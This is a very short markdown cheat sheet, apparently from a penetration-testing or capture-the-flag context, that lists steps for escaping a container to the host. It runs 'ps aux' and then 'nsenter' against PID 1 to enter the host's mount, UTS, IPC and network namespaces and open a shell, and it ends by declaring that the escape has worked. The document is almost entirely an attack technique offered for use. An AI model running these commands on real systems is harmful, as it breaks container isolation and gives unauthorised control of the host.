# STEPS

### 1) ps aux to list processes

### 2) If we detect anything interesting, we can invoke the command: nsenter --target 1 --mount sh or: nsenter --target 1 --mount --uts --ipc --net /bin/bash

### 3) If it worked, we escaped the container!
